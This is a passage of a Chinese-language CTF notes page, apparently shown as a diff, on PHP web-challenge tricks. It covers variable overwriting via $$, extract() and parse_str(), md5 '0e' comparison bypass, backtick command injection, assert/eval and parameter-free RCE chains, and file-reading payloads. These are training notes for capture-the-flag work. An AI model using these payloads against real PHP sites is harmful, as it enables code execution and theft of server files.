+</span></span><span class=line><span class=cl>    exit($is);
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>echo &#34;the flag is: &#34;.$flag;
+</span></span></code></pre></div><p><strong>题目分析：</strong></p><p>代码审计得知绕过三个<code>if</code>函数直接<code>echo</code>明显不现实 所以突破点就是那三个<code>exit</code></p><p>:::tips
+exit() 输出一条消息，并退出当前脚本</p><p>:::</p><p>上面我们要想绕过需要：</p><ul><li><strong>get参数</strong>必须含有<code>$x</code>同时<code>$x</code>不能含有<strong>flag</strong></li><li>存在<strong>get参数</strong>或者存在<strong>post参数</strong></li><li><strong>post参数</strong>恒等于<strong>flag</strong>或者<strong>get参数</strong>恒等于<strong>flag</strong><br>当我们到达最后的时候flag也被重置了</li></ul><p>在这一关可以执行输出内容地方有两个函数<code>exit</code>和<code>echo</code></p><h5 id=法1覆盖-yds class=headerLink><a href=#%e6%b3%951%e8%a6%86%e7%9b%96-yds class=header-mark></a>法1——覆盖 <code>yds</code></h5><p>让<code>$flag</code>覆盖到<code>yds</code>上，在执行<code>exit($yds);</code>的时候输出<strong>flag</strong></p><p><strong>payload:</strong></p><p><code>?yds=flag</code></p><p>我们进行get传参的时候，会执行:</p><p>:::tips
+foreach($_GET as $x => $y){　　　</p><p>$$x = $$y; //GET型变量重新赋值为当前文件变量中以其值>为键名的值</p><p>}</p><p>:::</p><p>:::tips
+if(!isset($_GET[&lsquo;flag&rsquo;]) && !isset($_POST[&lsquo;flag&rsquo;])){  <br>    exit($yds);<br>}</p><p>:::</p><p>语句输出<code>$yds</code>，我们只需让<code>$yds=$flag</code>就好了，由于我们输入的变量是<code>yds=flag</code><br>所以<code>$x=yds</code> <code>$y=flag</code>，再由<code>$$x = $$y</code> 可知 <code>$yds=$flag</code>，<code>$flag</code>是我们要的</p><p>综上：<code>exit($yds)</code>就是<code>echo $flag</code></p><h5 id=法2覆盖is class=headerLink><a href=#%e6%b3%952%e8%a6%86%e7%9b%96is class=header-mark></a>法2——覆盖<code>is</code></h5><p>前半段和前面的方法原理相同，让flag覆盖is<br>后面的<code>flag=flag</code>—><code>$flag=$flag</code>目的是为了符合第三个<code>if</code>需求：</p><p>:::tips
+if($_POST[&lsquo;flag&rsquo;] === &lsquo;flag&rsquo; || $_GET[&lsquo;flag&rsquo;] === &lsquo;flag&rsquo;){<br>exit($is);<br>}</p><p>:::</p><p>进而输出<code>flag</code></p><p><strong>payload:</strong></p><p><code>?is=flag&amp;flag=flag</code></p><h5 id=法3覆盖handsome class=headerLink><a href=#%e6%b3%953%e8%a6%86%e7%9b%96handsome class=header-mark></a>法3——覆盖<code>handsome</code></h5><p>:::tips
+foreach($_GET as $x => $y){<br>    if($_GET[&lsquo;flag&rsquo;] === $x && $x !== &lsquo;flag&rsquo;){<br>        exit($handsome);<br>    }<br>}</p><p>:::</p><p><code>handsome=flag</code>就是让<code>$handsome=$flag</code><br>目的就是让我们传入的变量是<code>flag</code>值不是<strong>flag</strong>进而能够执行<code>exit($handsome);</code></p><p>这里的值表面是 <code>x</code>但前面我们进行了变量覆盖使得<code>x=flag</code>所以在这里我们输出<code>x</code>的值就是<code>flag</code>值</p><p><strong>payload:</strong></p><p><code>?handsome=flag&amp;flag=x&amp;x=flag</code></p><h3 id=extract class=headerLink><a href=#extract class=header-mark></a><code>extract()</code></h3><p><code>extract()</code> 该函数使用<strong>数组键名</strong>作为<strong>变量名</strong>，使用<strong>数组键值</strong>作为<strong>变量值</strong>。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>$data = array(
+</span></span><span class=line><span class=cl>    &#34;name&#34; =&gt; &#34;John&#34;,
+</span></span><span class=line><span class=cl>    &#34;age&#34; =&gt; 30,
+</span></span><span class=line><span class=cl>    &#34;city&#34; =&gt; &#34;New York&#34;
+</span></span><span class=line><span class=cl>);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>extract($data);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>echo &#34;Name: $name, Age: $age, City: $city&#34;;
+</span></span><span class=line><span class=cl>?&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>//输出：
+</span></span><span class=line><span class=cl>//Name: John, Age: 30, City: New York
+</span></span></code></pre></div><h4 id=例题1-1 class=headerLink><a href=#%e4%be%8b%e9%a2%981-1 class=header-mark></a>例题1</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   $flag = &#39;xxx&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   extract($_GET);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   if(isset($gift)) 
+</span></span><span class=line><span class=cl>   {
+</span></span><span class=line><span class=cl>       $content = trim(file_get_contents($flag));
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       if($gift == $content) 
+</span></span><span class=line><span class=cl>      {
+</span></span><span class=line><span class=cl>            echo &#39;flaaaaaag&#39;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      } 
+</span></span><span class=line><span class=cl>       else 
+</span></span><span class=line><span class=cl>		{
+</span></span><span class=line><span class=cl>           echo &#39;nonono&#39;;
+</span></span><span class=line><span class=cl>		}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   } 
+</span></span><span class=line><span class=cl>?&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>//trim() 函数移除字符串两侧的空白字符或其他预定义字符
+</span></span></code></pre></div><p>**题目分析： **</p><p>题目使用了<code>extract($_GET)</code>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用<code>extract()</code>对变量进行覆盖，从而满足各个条件。</p><p>**解题方法： **</p><p>GET请求<code>?flag=&amp;gift=</code>，<code>extract()</code>会将flag和gift的值覆盖了，将变量的值设置为<strong>空</strong>或者<strong>不存在的文件</strong>就满足<code>gift==content</code></p><p><strong>最终payload</strong>：</p><p>GET DATA：<code>?flag=&amp;gift=</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105102.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105102.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105102.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105102.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105102.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105102.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105102.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105102.png></a></figure></p><h4 id=例题2 class=headerLink><a href=#%e4%be%8b%e9%a2%982 class=header-mark></a>例题2</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php 
+</span></span><span class=line><span class=cl>    if ($_SERVER[&#34;REQUEST_METHOD&#34;] == “POST”) 
+</span></span><span class=line><span class=cl>   {
+</span></span><span class=line><span class=cl>        extract($_POST);
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>        if ($pass == $thepassword_123) 
+</span></span><span class=line><span class=cl>       { 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            &lt;div class=”alert alert-success”&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            &lt;/div&gt;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        } 
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></div><p>**题目分析： **</p><p>题目要求使用POST提交数据，<code>extract($_POST)</code>会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖<code>$pass</code>和<code>$thepassword_123</code>变量的值，从而满足<code>pass==thepassword_123</code>这个条件。</p><p>**解题方法： **</p><p>使用POST请求提交<code>pass=&amp;thepassword_123=</code> ，然后<code>extract()</code>会将接收到的数据将<code>$pass</code>和<code>$thepassword_123</code>变量的值覆盖为空，便满足条件了。</p><p>**最终payload： **</p><p>POST DATA：<code>pass=&amp;thepassword_123=</code></p><h3 id=parse_str class=headerLink><a href=#parse_str class=header-mark></a><code>parse_str()</code></h3><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105103.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105103.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105103.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105103.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105103.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105103.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105103.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105103.png></a></figure></p><p><code>parse_str()</code>函数用于将字符串解析成多个变量，如果没有array参数，则由该函数设置的变量将覆盖已存在的同名变量</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105104.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105104.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105104.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105104.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105104.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105104.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105104.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105104.png></a></figure></p><h4 id=例题1-2 class=headerLink><a href=#%e4%be%8b%e9%a2%981-2 class=header-mark></a>例题1</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       error_reporting(0);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       if (empty($_GET[&#39;id&#39;])) 
+</span></span><span class=line><span class=cl>      {
+</span></span><span class=line><span class=cl>            show_source(__FILE__);
+</span></span><span class=line><span class=cl>            die();
+</span></span><span class=line><span class=cl>      } 
+</span></span><span class=line><span class=cl>      else 
+</span></span><span class=line><span class=cl>     {
+</span></span><span class=line><span class=cl>            $a = &#34;www.OPENCTF.com&#34;;
+</span></span><span class=line><span class=cl>            $id = $_GET[&#39;id&#39;];
+</span></span><span class=line><span class=cl>            @parse_str($id);
+</span></span><span class=line><span class=cl>            if ($a[0] != &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) == md5(&#39;QNKCDZO&#39;)) 
+</span></span><span class=line><span class=cl>           {
+</span></span><span class=line><span class=cl>                 echo flaaaaaag;
+</span></span><span class=line><span class=cl>           } 
+</span></span><span class=line><span class=cl>           else 
+</span></span><span class=line><span class=cl>           {
+</span></span><span class=line><span class=cl>                 exit(&#39;其实很简单其实并不难！&#39;);
+</span></span><span class=line><span class=cl>           }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>?&gt; 
+</span></span></code></pre></div><p>**题目分析： **</p><p>首先要求使用GET提交id参数，然后<code>parse_str($id)</code>对<code>id</code>参数的数据进行处理，再使用判断<code>a[0] != ‘QNKCDZO’ && md5(a[0] != ‘QNKCDZO’ && md5(a[0]) == md5(‘QNKCDZO’)</code>的结果是否为真，为真就返回<code>flaaaaaag</code>，<code>md5(‘QNKCDZO’)</code>的结果是<code>0e830400451993494058024219903391</code>由于此次要满足<code>a[0] != ‘QNKCDZO’ && md5(a[0] != ‘QNKCDZO’ && md5(a[0]) == md5(‘QNKCDZO’)</code>所以要利用php弱语言特性(详细见前面<a href=#vMVSb rel>md5漏洞利用</a>)，所以需要找到一个字符串md5后的结果是0e开头后面都是数字的</p><p>**解题方法： **</p><p>使用GET请求，将<code>a[0]</code>随便传一个MD5(值)计算后结果开头是0e，<code>id=a[0]=**s878926199a **</code></p><p>**最终payload： **</p><p>GET DATA:</p><p><code>?id=a[0]=s878926199a</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105105.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105105.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105105.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105105.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105105.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105105.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105105.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105105.png></a></figure></p><h2 id=非法变量名转换 class=headerLink><a href=#%e9%9d%9e%e6%b3%95%e5%8f%98%e9%87%8f%e5%90%8d%e8%bd%ac%e6%8d%a2 class=header-mark></a>非法变量名转换</h2><blockquote><p>变量名与 PHP 中其它的标签一样遵循相同的规则。一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字，或者下划线。 按照正常的正则表达式，它将被表述为：<code>^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$</code></p></blockquote><p>非法的字符 (点, 空格, 括号等) 会被转换成下划线</p><p>例如过滤了 <code>_</code> 如何构造 <code>__CTFSHOW__</code> ?</p><p>答案是传参的时候参数名写成 <code>..CTFSHOW..</code></p><p>另外有一个绕过转换的 trick, <strong>PHP &lt; 8 有效</strong></p><p><a href=https://blog.csdn.net/mochu7777777/article/details/115050295 target=_blank rel="noopener noreferrer">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p><p><code>[</code> 被转换为<code>_</code>, 而后面的 <code>.</code> 不转换（<strong>只替换一次</strong>）</p><p>例如, 构造 <code>CTF_SHOW.COM</code> 的变量名可以传参 <code>CTF[SHOW.COM</code></p><p>在变量覆盖的时候会很有用</p><h2 id=不加引号的字符串 class=headerLink><a href=#%e4%b8%8d%e5%8a%a0%e5%bc%95%e5%8f%b7%e7%9a%84%e5%ad%97%e7%ac%a6%e4%b8%b2 class=header-mark></a>不加引号的字符串</h2><p>PHP 会自动帮我们推断对应值的类型</p><p>例如下面的代码执行后会爆 Warning, 但能正常输出 <code>flag_give_me</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>$fl0g = flag_give_me;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>echo $fl0g;
+</span></span></code></pre></div><h2 id=反引号内引用变量 class=headerLink><a href=#%e5%8f%8d%e5%bc%95%e5%8f%b7%e5%86%85%e5%bc%95%e7%94%a8%e5%8f%98%e9%87%8f class=header-mark></a>反引号内引用变量</h2><p>``$F<code>; sleep 3</code></p><p>反引号内能够引用变量, 与 <code>"$var"</code> 类似</p><p><a href=https://blog.csdn.net/qq_46091464/article/details/109095382 target=_blank rel="noopener noreferrer">ctfshow web133和其他命令执行的骚操作</a></p><h2 id=globalsget_defined_vars class=headerLink><a href=#globalsget_defined_vars class=header-mark></a>$GLOBALS/get_defined_vars()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105106.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105106.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105106.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105106.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105106.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105106.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105106.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105106.png></a></figure></p><p>在 PHP 中, 被定义在函数外部的变量, 拥有全局作用域, 被称作全局变量</p><p>如果要想在函数内部使用全局变量, 必须通过 <code>global $var</code> 来显式引用或者是通过超全局变量数组 <code>$GLOBALS['var']</code>来访问</p><p><code>$GLOBALS</code> 数组存储着文件中所有的全局变量 (包含 include 进来的全局变量)</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105107.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105107.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105107.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105107.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105107.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105107.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105107.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105107.png></a></figure></p><p><code>get_defined_vars()</code> 返回由所有已定义变量所组成的数组</p><p>有时候可以从这里面查看 <code>$flag</code></p><h2 id=_serverargv-与-_serverquery_string class=headerLink><a href=#_serverargv-%e4%b8%8e-_serverquery_string class=header-mark></a>$_SERVER[&lsquo;argv&rsquo;] 与 $_SERVER[&lsquo;QUERY_STRING&rsquo;]</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105108.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105108.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105108.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105108.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105108.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105108.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105108.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105108.png></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105109.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105109.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105109.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105109.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105109.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105109.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105109.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105109.png></a></figure></p><p><code>$_SERVER['argv']</code>与 <code>$_SERVER['QUERY_STRING']</code> 不同的是前者是数组, 而后者是一整个字符串</p><p><code>$_SERVER['argv']</code> 数组里面的每一项在 GET 传参中以空格分隔 (url 编码以后就是加号)</p><p><strong>注意这两个变量的值都会进行 url 编码</strong></p><h2 id=assert class=headerLink><a href=#assert class=header-mark></a>assert()</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105110.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105110.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105110.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105110.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105110.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105110.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105110.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105110.png></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105111.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105111.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105111.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105111.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105111.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105111.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105111.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105111.png></a></figure></p><p>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行 可见，<code>eval</code>和<code>assert</code>都可以将字符当作代码执行，只不过assert不需要严格遵从语法语句末尾的<strong>分号可不加</strong></p><h2 id=不含字母数字的函数gettext拓展 class=headerLink><a href=#%e4%b8%8d%e5%90%ab%e5%ad%97%e6%af%8d%e6%95%b0%e5%ad%97%e7%9a%84%e5%87%bd%e6%95%b0gettext%e6%8b%93%e5%b1%95 class=header-mark></a>不含字母数字的函数(gettext()拓展)</h2><p><a href=https://www.cnblogs.com/lost-1987/articles/3309693.html target=_blank rel="noopener noreferrer">关于php中gettext的用法</a></p><p><code>gettext()</code> 用于实现输出的国际化, 在不同区域输出不同语言的内容</p><p><strong>本地测试时需要开启 <strong><code>**php_gettext**</code></strong> 扩展</strong></p><p><code>_()</code> 为 <code>gettext()</code> 别名, 类似于 echo 输出</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105112.png title=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105112.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105112.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105112.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105112.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105112.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105112.png 2x" sizes=auto alt=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/blog/202410152105112.png></a></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>echo gettext(&#34;phpinfo&#34;); 
+</span></span><span class=line><span class=cl>结果  phpinfo
+</span></span><span class=line><span class=cl>echo _(&#34;phpinfo&#34;); 
+</span></span><span class=line><span class=cl>结果 phpinfo 
+</span></span></code></pre></div><p><code>var_dump(call_user_func(call_user_func("_", "get_defined_vars")));</code>此命令可以返回所有已定义变量</p><p>一层 <code>call_user_func("_", "xx")</code> 返回 <code>xx</code> 字符串, 然后被当作回调函数名被第二个 <code>call_user_func()</code> 调用</p><p>也就是说我们最终利用的函数不能含有参数, 而且必须是一步到位的</p><h2 id=解析特性 class=headerLink><a href=#%e8%a7%a3%e6%9e%90%e7%89%b9%e6%80%a7 class=header-mark></a>解析特性</h2><p>php需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事</p><p>1.删除空白符</p><p>2.将某些字符转换为下划线（点、空格）</p><table><thead><tr><th style=text-align:center><strong>原变量名</strong></th><th style=text-align:center><strong>PHP转换后变量名</strong></th></tr></thead><tbody><tr><td style=text-align:center>e_v.a.l</td><td style=text-align:center>e_v_a_l</td></tr><tr><td style=text-align:center>e[v_a.l</td><td style=text-align:center>e_v_a.l</td></tr><tr><td style=text-align:center>e v_a.l</td><td style=text-align:center>e_v_a_l</td></tr><tr><td style=text-align:center>e.v.a.l</td><td style=text-align:center>e_v_a_l</td></tr><tr><td style=text-align:center>e+v_a.l</td><td style=text-align:center>e+v_a_l</td></tr><tr><td style=text-align:center>e]v_a.l</td><td style=text-align:center>e]v_a_l</td></tr></tbody></table><p>当<strong>PHP版本小于8</strong>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误，导致接下来如果该参数名中<strong>还有非法字符</strong>并不会转换成下划线_。<strong>即中括号只能替换一次。</strong></p><h2 id=原生类列目录rce class=headerLink><a href=#%e5%8e%9f%e7%94%9f%e7%b1%bb%e5%88%97%e7%9b%ae%e5%bd%95rce class=header-mark></a>原生类列目录/RCE</h2><p>一般都是 <code>echo new $v1($v2('xxx'))</code> 或者 <code>eval($v('ctfshow'))</code> 的形式, 有时候可以跳出来执行其它代码</p><p><code>ReflectionClass</code> 和 <code>Exception</code> 里面可以执行其它函数</p><p><code>FilesystemIterator</code> 列目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;xx&#39;</span><span class=p>))</span>
 </span></span><span class=line><span class=cl><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;xx&#39;</span><span class=p>))</span>
 </span></span><span class=line><span class=cl><span class=k>new</span> <span class=nx>FilesystemIterator</span><span class=p>(</span><span class=nx>getcwd</span><span class=p>())</span>
 </span></span><span class=line><span class=cl><span class=k>new</span> <span class=nx>ReflectionClass</span><span class=p>(</span><span class=s1>&#39;stdClass&#39;</span><span class=p>);</span><span class=nx>system</span><span class=p>()</span><span class=c1>//
-</span></span></span></code></pre></div><h2 id=无参数函数读文件rce class=headerLink><a href=#%e6%97%a0%e5%8f%82%e6%95%b0%e5%87%bd%e6%95%b0%e8%af%bb%e6%96%87%e4%bb%b6rce class=header-mark></a>无参数函数读文件/RCE</h2><p>无参数函数指形如 <code>a(b(c()))</code> 这种不需要参数或者只需要一个参数, 并且对应的参数可以通过另一个函数的返回值来获取的函数
-例如在当前目录仅存在 <code>index.php</code> <code>flag.php</code> 的情况下, 无参数读取 <code>flag.php</code> 的内容
-<code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code>
-或者是配合 get 传参进行 rce
-<code>eval(end(current(get_defined_vars())))</code>
-<a href=https://www.freebuf.com/articles/system/242482.html target=_blank rel="noopener noreferrer">无参数读文件和RCE总结</a>
-<a href=https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE target=_blank rel="noopener noreferrer">PHP Parametric Function RCE</a></p><h2 id=nlcpmvtee写文件 class=headerLink><a href=#nlcpmvtee%e5%86%99%e6%96%87%e4%bb%b6 class=header-mark></a>nl、cp、mv、tee写文件</h2><p>在禁命令的时候没有限制写文件：</p><pre tabindex=0><code>nl flag.php&gt;1.txt
-cp flag.php&gt;1.txt
-mv flag.php&gt;1.txt
-</code></pre><p>tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件</p><pre tabindex=0><code>ls /|tee 1
-然后访问/1下载文件
-</code></pre><h2 id=静态调用方法 class=headerLink><a href=#%e9%9d%99%e6%80%81%e8%b0%83%e7%94%a8%e6%96%b9%e6%b3%95 class=header-mark></a>静态调用方法</h2><pre tabindex=0><code>&lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-class ctfshow
-{
-    function __wakeup(){
-        die(&#34;private class&#34;);
-    }
-    static function getFlag(){
-        echo file_get_contents(&#34;flag.php&#34;);
-    }
-}
-
-call_user_func($_POST[&#39;ctfshow&#39;]);
-</code></pre><p>两种方式
-<strong>通过</strong><code>**::**</code><strong>访问</strong>
-<code>ctfshow=ctfshow::getFlag</code>
-<strong>通过 <strong><code>**call_user_func($_POST['ctfshow'])**</code></strong> 以数组形式调用静态方法</strong>
